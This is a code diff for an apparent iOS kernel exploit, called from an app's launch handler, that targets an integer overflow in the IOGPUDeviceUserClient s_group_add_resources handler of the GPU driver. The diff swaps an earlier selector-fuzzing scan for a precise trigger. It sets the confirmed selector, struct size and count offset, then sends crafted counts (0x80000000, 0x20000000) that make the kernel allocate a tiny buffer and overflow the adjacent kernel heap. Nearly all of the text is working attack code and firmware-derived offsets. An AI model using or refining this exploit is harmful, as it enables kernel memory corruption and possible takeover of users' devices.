@@ -9,9 +9,11 @@
  *   smull(-1, 24) + 8 = -16 -> kalloc(-16) = small/bogus allocation.
  * Subsequent writes of count elements corrupt adjacent kernel heap.
  *
- * Trigger path: MTLResidencySet.addResources:count: (Metal public API)
- *   -> IOGPUFamily IOUserClient selector 0x196
- *   -> s_group_add_resources kernel function
+ * Trigger path (firmware-confirmed, iOS 26.5 binary):
+ *   IOServiceOpen(AGXAcceleratorG18P, task, type=1, &conn)
+ *   -> IOConnectCallMethod(conn, sel=6, struct[0x408], count@[+0x20])
+ *   -> IOGPUDeviceUserClient::s_group_add_resources kernel function
+ *   (selector 0x196 was wrong — SGAR is at index 6 in the dispatch table)
  *   -> integer overflow in element array size computation
  *
  * Variant 2 (also affects same code): craft count = 0x80000001 so
@@ -243,135 +245,103 @@ extern kern_return_t IOConnectCallMethod(io_connect_t conn, uint32_t sel,
     const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inSz,
     uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outSz);
 
+/*
+ * s_group_add_resources dispatch table analysis (iOS 26.5 firmware):
+ *   Class:    IOGPUDeviceUserClient
+ *   Type:     1 (AGXAcceleratorG18P)
+ *   Selector: 6  (NOT 0x196 — that was wrong)
+ *   st_in:    0xffffffff (variable, function enforces 0x408 internally)
+ *   st_out:   0x10 (16 bytes)
+ *   Size check at 0xfffffe0009bebb74: cmp w8,#0x408; ccmp w8,w9,#0,hs; b.eq proceed
+ *   Count:    [structInput + 0x20] uint32_t
+ */
+#define SGAR_SELECTOR        6
+#define SGAR_STRUCT_SIZE     0x408
+#define SGAR_COUNT_OFFSET    0x20
+
+static void try_sgar(io_connect_t conn, uint32_t count, const char *label) {
+    static uint8_t add_in[SGAR_STRUCT_SIZE];
+    uint8_t add_out[0x10];
+    size_t  add_out_sz = sizeof(add_out);
+    uint32_t out_cnt   = 0;
+
+    memset(add_in,  0, sizeof(add_in));
+    memset(add_out, 0, sizeof(add_out));
+    *(uint32_t *)(add_in + SGAR_COUNT_OFFSET) = count;
+
+    kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+        NULL, 0, add_in, sizeof(add_in),
+        NULL, &out_cnt, add_out, &add_out_sz);
+
+    evf("[BOF] %s count=0x%x kr=0x%x", label, count, kr);
+    if (kr == 0)
+        evf("[BOF] %s SUCCESS out[0]=0x%llx", label,
+            *(uint64_t *)add_out);
+}
+
 static void trigger_bof_iokit(void) {
-    evf("IOKIT PROBE: full scan start");
-
-    const char *svc_names[] = {
-        "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", "IOAccelerator", NULL
-    };
-    const uint32_t ctypes[] = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 };
-    const int N_CTYPES = 16;
-
-    typedef struct { const char *svc; uint32_t ctype; io_connect_t conn; } CEntry;
-    CEntry conns[36];
-    int nc = 0;
+    evf("[BOF] IOKIT_START sel=%d struct=0x%x count_off=0x%x",
+        SGAR_SELECTOR, SGAR_STRUCT_SIZE, SGAR_COUNT_OFFSET);
 
     mach_port_t master = 0;
     IOMasterPort(MACH_PORT_NULL, &master);
 
-    for (int si = 0; svc_names[si]; si++) {
-        CFMutableDictionaryRef match = IOServiceMatching(svc_names[si]);
+    /* Open AGXAcceleratorG18P type=1 (IOGPUDeviceUserClient) */
+    io_connect_t conn = 0;
+    const char *svc_try[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
+    for (int si = 0; svc_try[si] && !conn; si++) {
+        CFMutableDictionaryRef match = IOServiceMatching(svc_try[si]);
         io_iterator_t it = 0;
         IOServiceGetMatchingServices(master, match, &it);
         io_service_t svc = IOIteratorNext(it);
         IOObjectRelease(it);
         if (!svc) continue;
 
-        for (int ti = 0; ti < N_CTYPES; ti++) {
-            io_connect_t c = 0;
-            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), ctypes[ti], &c);
-            if (kr == 0) {
-                evf("OPEN %s t=%u conn=0x%x", svc_names[si], ctypes[ti], c);
-                conns[nc++] = (CEntry){svc_names[si], ctypes[ti], c};
-            }
-        }
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
         IOObjectRelease(svc);
-    }
-    evf("OPEN_DONE: %d connections", nc);
-
-    /* Selector scan: report anything != kIOReturnUnsupported (0xe00002c7) */
-    for (int ci = 0; ci < nc; ci++) {
-        io_connect_t conn = conns[ci].conn;
-        uint8_t st_in[128] = {0};
-        uint64_t sc_out[4] = {0};
-        uint32_t sc_cnt = 4;
-        uint8_t st_out[64] = {0};
-        size_t st_out_sz = sizeof(st_out);
-
-        for (uint32_t sel = 0x00; sel <= 0x1FF; sel++) {
-            sc_cnt = 4; st_out_sz = sizeof(st_out);
-            kern_return_t kr = IOConnectCallMethod(conn, sel,
-                NULL, 0, st_in, sizeof(st_in),
-                sc_out, &sc_cnt, st_out, &st_out_sz);
-            if (kr != 0xe00002c7) {
-                evf("HIT %s t=%u sel=0x%x kr=0x%x",
-                    conns[ci].svc, conns[ci].ctype, sel, kr);
-                /* For HIT selectors, also try with scalars */
-                for (int ns = 1; ns <= 2; ns++) {
-                    uint64_t sc_in[2] = {0};
-                    sc_cnt = 4; st_out_sz = sizeof(st_out);
-                    kr = IOConnectCallMethod(conn, sel,
-                        sc_in, ns, st_in, sizeof(st_in),
-                        sc_out, &sc_cnt, st_out, &st_out_sz);
-                    evf("HIT %s t=%u sel=0x%x ns=%d kr=0x%x",
-                        conns[ci].svc, conns[ci].ctype, sel, ns, kr);
-                }
-            }
-        }
-    }
-    evf("SCAN_DONE");
-
-    /* Sub-connection spawning from type-2 (IOGPUDeviceUserClient):
-     * ResourceGroup client is spawned by a factory selector on the device client.
-     * Scan type-2 for selectors that return a new mach port (not kIOReturnUnsupported). */
-    for (int ci = 0; ci < nc; ci++) {
-        if (conns[ci].ctype != 2) continue;
-        io_connect_t dev_conn = conns[ci].conn;
-        evf("FACTORY_SCAN %s t=2: looking for resource-group factory selector",
-            conns[ci].svc);
-        /* Scan selectors 0..0xFF for non-Unsupported response = potential factory */
-        for (uint32_t sel = 0; sel < 0x100; sel++) {
-            uint64_t sc_in[4] = {0};
-            uint64_t sc_out[4] = {0};
-            uint32_t sc_cnt = 4;
-            uint8_t st_in[64] = {0};
-            uint8_t st_out[64] = {0};
-            size_t st_sz = sizeof(st_out);
-            kern_return_t kr = IOConnectCallMethod(dev_conn, sel,
-                sc_in, 0, st_in, sizeof(st_in),
-                sc_out, &sc_cnt, st_out, &st_sz);
-            if (kr != 0xe00002c7) {
-                evf("FACTORY_HIT t=2 sel=0x%x kr=0x%x sc_out[0]=0x%llx",
-                    sel, kr, sc_out[0]);
-                /* If out[0] looks like a mach port → sub-connection established */
-                if (kr == 0 && sc_out[0] != 0) {
-                    evf("SUBCONN port=0x%llx trying sel 0x196", sc_out[0]);
-                    /* sc_out[0] may be a connection port — scan it for 0x196 */
-                    io_connect_t sub = (io_connect_t)sc_out[0];
-                    uint8_t add_in[128] = {0};
-                    *(uint32_t*)(add_in + 0x20) = 4;  /* count=4 at offset 0x20 */
-                    uint32_t out_cnt = 4;
-                    size_t out_sz = sizeof(st_out);
-                    kern_return_t kr2 = IOConnectCallMethod(sub, 0x196,
-                        NULL, 0, add_in, sizeof(add_in),
-                        sc_out, &out_cnt, st_out, &out_sz);
-                    evf("SUBCONN_0x196 kr=0x%x", kr2);
-                }
-            }
-        }
+        if (kr == 0 && conn)
+            evf("[BOF] OPEN %s type=1 conn=0x%x OK", svc_try[si], conn);
+        else
+            evf("[BOF] OPEN %s type=1 FAIL kr=0x%x", svc_try[si], kr);
     }
 
-    /* Direct selector 0x196 probe on all open connections */
-    for (int ci = 0; ci < nc; ci++) {
-        io_connect_t conn = conns[ci].conn;
-        uint64_t sc_in[4] = {0};
-        uint64_t sc_out[4] = {0};
-        uint32_t sc_cnt = 4;
-        uint8_t add_in[128] = {0};
-        uint8_t add_out[64] = {0};
-        size_t add_out_sz = sizeof(add_out);
+    if (!conn) {
+        evf("[BOF] NO_CONN: cannot open IOGPUDeviceUserClient");
+        return;
+    }
 
-        /* count=4 at offset 0x20 (where s_group_add_resources reads it) */
-        *(uint32_t*)(add_in + 0x20) = 4;
-        kern_return_t kr = IOConnectCallMethod(conn, 0x196,
-            sc_in, 0, add_in, sizeof(add_in),
-            sc_out, &sc_cnt, add_out, &add_out_sz);
+    /* Baseline: count=4 → expect kIOReturnSuccess (0x0) on patched or unpatched */
+    try_sgar(conn, 4,           "BASELINE_4");
+    try_sgar(conn, 16,          "BASELINE_16");
+
+    /* Overflow: count=INT32_MIN → smull(-2147483648, 24)+8 = -8 → tiny alloc + BOF */
+    try_sgar(conn, 0x80000000u, "OVERFLOW_INT32MIN");
+
+    /* If INT32_MIN doesn't trigger, try variant: count=0x20000000 */
+    /* smull(0x20000000, 24)+8 = 0x300000008 → truncated to 8 bytes → BOF */
+    try_sgar(conn, 0x20000000u, "OVERFLOW_0x20000000");
+
+    /* Diagnostic: probe adjacent sizes to find what device->0x278 is */
+    /* If all above return 0xe00002c2 (bad arg), the struct size check is failing */
+    static const uint32_t probe_sizes[] = {
+        0x40, 0x80, 0x100, 0x200, 0x300, 0x400, 0x408, 0x410, 0x500, 0x600, 0
+    };
+    for (int i = 0; probe_sizes[i]; i++) {
+        uint8_t tmp_in[0x800] = {0};
+        uint8_t tmp_out[0x10] = {0};
+        size_t  tmp_out_sz = sizeof(tmp_out);
+        uint32_t out_cnt = 0;
+        *(uint32_t *)(tmp_in + SGAR_COUNT_OFFSET) = 4;
+        kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+            NULL, 0, tmp_in, probe_sizes[i],
+            NULL, &out_cnt, tmp_out, &tmp_out_sz);
+        /* Only report non-unsupported (filter noise) */
         if (kr != 0xe00002c7)
-            evf("DIRECT_0x196 %s t=%u kr=0x%x", conns[ci].svc, conns[ci].ctype, kr);
-
-        IOServiceClose(conn);
+            evf("[BOF] SIZE_PROBE sz=0x%x kr=0x%x", probe_sizes[i], kr);
     }
-    evf("IOKIT PROBE COMPLETE");
+
+    IOServiceClose(conn);
+    evf("[BOF] IOKIT_DONE");
 }
 
 /* App entry point — called from application:didFinishLaunchingWithOptions: */
